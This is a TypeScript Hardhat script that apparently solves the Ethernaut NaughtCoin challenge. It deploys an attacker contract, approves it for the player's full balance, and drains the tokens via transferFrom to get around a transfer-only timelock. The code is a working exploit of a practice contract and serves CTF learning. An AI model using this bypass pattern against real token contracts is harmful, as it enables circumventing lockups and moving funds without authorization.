import { ethers } from "hardhat";
import * as fs from 'fs';
import { NaughtCoin__factory, NaughtCoinAttacker__factory } from '../typechain-types';
import { privateKey, rpc } from "../hardhat.config";

// Task: getting your token balance to 0

const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    console.log("Hacking the contract...");

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/NaughtCoinAttacker.sol/NaughtCoinAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy(instanceAddress);
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = NaughtCoinAttacker__factory.connect(attackerAddress, signer);
    const victim = NaughtCoin__factory.connect(instanceAddress, signer);

    let balance = await victim.balanceOf(signer.address);

    tx = await victim.approve(attacker.target, balance);
    await tx.wait();

    tx = await attacker.attack(victim.target, balance);
    await tx.wait();
    
    balance = await victim.balanceOf(signer.address);

    console.log("Successfully hacked!");
    console.log("Your balance:", balance);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});